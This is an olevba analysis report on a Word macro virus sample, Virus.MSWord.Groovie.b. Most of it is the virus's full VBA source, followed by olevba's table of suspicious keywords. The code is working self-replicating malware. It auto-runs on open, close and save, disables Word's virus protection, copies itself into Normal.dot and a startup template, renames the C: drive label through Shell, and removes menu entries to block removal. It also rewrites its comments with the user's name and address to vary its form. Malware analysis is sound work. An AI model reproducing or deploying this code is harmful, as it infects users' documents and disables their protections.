olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Groovie.b-da1071dadf7af9d8532d46e97a784bb7f6b785d0
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Groovie.b-da1071dadf7af9d8532d46e97a784bb7f6b785d0 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO groovie.bas 
in file: Virus.MSWord.Groovie.b-da1071dadf7af9d8532d46e97a784bb7f6b785d0 - OLE stream: 'Macros/VBA/groovie'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public I01 As String
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
Public I02 As Boolean
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
Public I03 As Boolean
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
Public I04 As Boolean
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
Public I05 As Boolean
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
Public I06 As String
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
Public I07 As Boolean
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
Public I08 As Boolean
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
Function I09()
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
On Error Resume Next
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
    If MacroContainer = NormalTemplate Then
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
        I01 = "normal"
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
        GoTo checkout
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
    End If
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
    If MacroContainer = ActiveDocument Then I01 = "document"
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
    If MacroContainer = "data.dot" Then I01 = "orbit"
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
checkout:
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
End Function
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
Function I10()
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
On Error Resume Next
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
    If Dir(Application.StartupPath + "\data.dot") = "data.dot" Then I02 = True
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
        If ActiveDocument.VBProject.VBComponents(i).Name = "groovie" Then I04 = True
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
    Next i
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
    For i = 1 To NormalTemplate.VBProject.VBComponents.Count
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
        If NormalTemplate.VBProject.VBComponents(i).Name = "groovie" Then I03 = True
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
    Next i
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
    If GetAttr(NormalTemplate.FullName) = vbArchive + vbReadOnly Or GetAttr(NormalTemplate.FullName) = vbReadOnly Then I05 = True
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
End Function
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
Function I11()
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
On Error Resume Next
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
Call I09
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
Call I10
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
    If I01 = "document" Then Call I12
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
    If I01 = "normal" Then Call I13
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
    If I01 = "orbit" Then Call I14
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
    If I05 = False Then CommandBars("tools").Controls("Macro").Delete
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
    If I05 = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
End Function
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
Function I12()
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
On Error Resume Next
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
    Application.VBE.ActiveVBProject.VBComponents("groovie").Export "c:\groovie.sys"
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
    If I03 = False And I05 = False Then
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
        With NormalTemplate.VBProject
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
        With .VBComponents.Import("c:\groovie.sys")
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
        End With
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
        End With
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
    End If
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
    If I02 = False Then
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
        If I08 = False Then Documents.Open FileName:=I06
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
        Shell ("label c: groovie"), 0
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
        Windows(1).Close
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
    End If
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
End Function
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
Function I13()
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
On Error Resume Next
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
Application.ScreenUpdating = False
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
    Call I17
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
    If I04 = False And I07 = True Then
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
        With ActiveDocument.VBProject
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
        With .VBComponents.Import("c:\groovie.sys")
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
        End With
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
        End With
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
        With Dialogs(wdDialogFileSummaryInfo)
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
            .Comments = "ALT-F11 says it's groovie!"
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
            .Execute
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
        End With
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
    End If
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
    If I02 = False And I07 = True Then
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
        If I08 = False Then Documents.Open FileName:=I06
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
        Windows(1).Close SaveChanges:=wdSaveChanges
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
    End If
 ' TB07/06/03 17:28:13995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
    If I02 = False And I07 = False Then
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
        Documents.Add Template:="", NewTemplate:=False
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
        Windows(1).Close SaveChanges:=wdSaveChanges
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
    End If
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
Application.ScreenUpdating = True
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
End Function
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
Function I14()
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
On Error Resume Next
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
Application.ScreenUpdating = False
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
        If I03 = False And I05 = False Then
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
            With NormalTemplate.VBProject
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
            With .VBComponents.Import("c:\groovie.sys")
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
            End With
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
            End With
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
            NormalTemplate.Save
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
        End If
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
        If I04 = False Then
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
            With ActiveDocument.VBProject
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
            With .VBComponents.Import("c:\groovie.sys")
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
            End With
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
            End With
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
            With Dialogs(wdDialogFileSummaryInfo)
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
                .Comments = "ALT-F11 says it's groovie!"
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
                .Execute
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
            End With
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
        End If
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
Application.ScreenUpdating = True
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
End Function
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
Function I15()
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
On Error Resume Next
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
    Options.VirusProtection = False
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
    Options.SaveNormalPrompt = False
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
    Options.ConfirmConversions = False
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
    I06 = ActiveDocument.FullName
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
    Call I11
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
End Function
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
Sub AutoOpen()
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
On Error Resume Next
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
Call I15
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
End Sub
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
Sub AutoClose()
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
On Error Resume Next
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
I08 = True
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
Call I15
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
End Sub
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
Sub AutoExit()
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
On Error Resume Next
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
Call I15
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
End Sub
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
Sub FileSaveAs()
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
On Error Resume Next
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
Call I16
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
Call I15
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
Dialogs(wdDialogFileSaveAs).Show
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
End Sub
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
Sub filesave()
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
On Error Resume Next
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
Call I16
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
Call I15
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
End Sub
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
Sub fileclose()
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
On Error Resume Next
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
I08 = True
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
Call I15
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
ActiveDocument.Close
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
End Sub
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
Sub fileprint()
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
On Error Resume Next
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
Call I15
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
Dialogs(wdDialogFilePrint).Show
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
End Sub
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
Sub ViewVBCode()
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
MsgBox "It's GROOVIE", vbOKOnly, "•  ALT-F11  • says..."
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
End Sub
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
Sub ToolsMacro()
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
End Sub
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
Sub FileTemplates()
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
End Sub
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
Function I17()
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
On Error GoTo docek
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
    If ActiveDocument.Name <> "" Then
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
        I07 = True
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
    End If
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
    GoTo over
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
docek:
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
    I07 = False
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
over:
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
End Function
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
Function I16()
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
Randomize
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
rn = Int(Rnd * 999)
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
With Application.VBE.ActiveVBProject.VBComponents("Groovie").codemodule
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
For x = 2 To 358 Step 2
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
.deletelines x
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
.InsertLines x, " ' " & Application.UserInitials & Now & rn & Application.UserName & Application.UserAddress & rn & Application.ActivePrinter
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
Next x
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
End With
 ' TB07/06/03 17:28:14995Trevor Browne995Canon PC1200/iC D600/iR1200G on LPT1:
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

